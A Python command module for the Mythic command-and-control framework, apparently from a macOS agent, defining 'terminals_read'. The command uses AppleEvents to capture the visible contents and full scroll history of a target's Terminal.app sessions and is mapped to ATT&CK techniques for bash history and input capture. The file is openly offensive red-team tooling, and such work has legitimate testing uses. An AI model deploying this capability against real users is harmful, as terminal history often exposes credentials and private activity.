from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *


class TerminalsReadArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "level": CommandParameter(
                name="level",
                type=ParameterType.ChooseOne,
                choices=["contents", "history"],
                description="How much data to retrive - what's viewable or all history",
            )
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                raise ValueError("Missing JSON arguments")
        else:
            raise ValueError("Missing arguments")


class TerminalsReadCommand(CommandBase):
    cmd = "terminals_read"
    needs_admin = False
    help_cmd = "terminals_read"
    description = """
    This uses AppleEvents to read information about open instances of Apple's Terminal.app. The contents flag allows you to see exactly what the user can see at that moment on the screen. The history flag allows you to see everything that's in that tab's scroll history. This can be a lot of information, so keep that in mind. This function will also give you the window/tab information for each open session and a bunch of other information.
Ex: terminals_read history
    """
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1139", "T1056"]
    argument_class = TerminalsReadArguments
    browser_script = BrowserScript(
        script_name="terminals_read", author="@its_a_feature_"
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = await MythicRPC().execute("create_artifact", task_id=task.id,
            artifact="Target Application of Terminal",
            artifact_type="AppleEvent Sent",
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass
